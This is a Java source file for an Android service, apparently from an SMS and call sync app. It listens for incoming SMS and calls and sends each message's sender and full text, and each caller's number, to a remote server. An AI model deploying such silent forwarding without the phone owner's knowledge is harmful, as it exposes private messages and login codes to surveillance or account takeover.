package com.luong.syncmaster.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.luong.syncmaster.listener.NetworkStateListener;
import com.luong.syncmaster.listener.SyncEventListener;
import com.luong.syncmaster.network.IOListener;
import com.luong.syncmaster.network.IOService;
import com.luong.syncmaster.receiver.CallReceiver;
import com.luong.syncmaster.receiver.NetworkStateReceiver;
import com.luong.syncmaster.receiver.SMSReceiver;

import org.json.JSONObject;

public class SyncMasterService extends Service implements NetworkStateListener, SyncEventListener, IOListener {

    private BroadcastReceiver networkChangeReceiver;
    private BroadcastReceiver smsReceiver;
    private CallReceiver callReceiver;

    public SyncMasterService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        networkChangeReceiver = new NetworkStateReceiver(this);
        smsReceiver = new SMSReceiver(this);
        callReceiver = new CallReceiver(this);
        registerReceivers();
        connect();
    }

    @Override
    public void onDestroy() {
        unregisterReceivers();
    }

    private void registerReceivers() {
        IntentFilter smsFilter = new IntentFilter();
        smsFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, smsFilter);

        IntentFilter networkChangeFilter = new IntentFilter();
        networkChangeFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        registerReceiver(networkChangeReceiver, networkChangeFilter);

        IntentFilter callFilter = new IntentFilter();
        callFilter.addAction("android.intent.action.PHONE_STATE");
        registerReceiver(callReceiver, callFilter);
    }

    private void unregisterReceivers() {
        unregisterReceiver(smsReceiver);
        unregisterReceiver(networkChangeReceiver);
        unregisterReceiver(callReceiver);
    }

    @Override
    public void onNetworkStateChange(String type, Object args) {
        Toast.makeText(this, "onNetworkStateChange: " + type, Toast.LENGTH_LONG).show();
    }

    @Override
    public void onEvent(String type, Object args) {
        try {
            if (type.equals(SyncEventListener.TYPE_IN_SMS)) {
                SmsMessage sms = (SmsMessage) args;
                JSONObject obj = new JSONObject();
                obj.put("type", SyncEventListener.TYPE_IN_SMS);
                obj.put("phone", sms.getDisplayOriginatingAddress());
                obj.put("data", sms.getDisplayMessageBody());
                IOService.getInstance().sendMessage("message", obj);
            } else if (type.equals(SyncEventListener.TYPE_IN_CALL)) {
                JSONObject obj = new JSONObject();
                obj.put("type", SyncEventListener.TYPE_IN_CALL);
                obj.put("phone", args.toString());
                obj.put("data", "");
                IOService.getInstance().sendMessage("message", obj);
            }
        } catch (Exception e) {
        }
    }

    private void connect() {
        IOService.getInstance().addNetworkListener(this);
    }

    @Override
    public void onIOMessage(JSONObject msg) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type", "device-received");
            obj.put("content", "server");
            IOService.getInstance().sendMessage("message", obj);
        } catch (Exception e) {

        }
    }

    @Override
    public void onIOStateChange(String status) {
        try {
            Toast.makeText(this, "onIOStateChange: " + status, Toast.LENGTH_LONG).show();
        } catch (Exception e) {
        }
    }
}
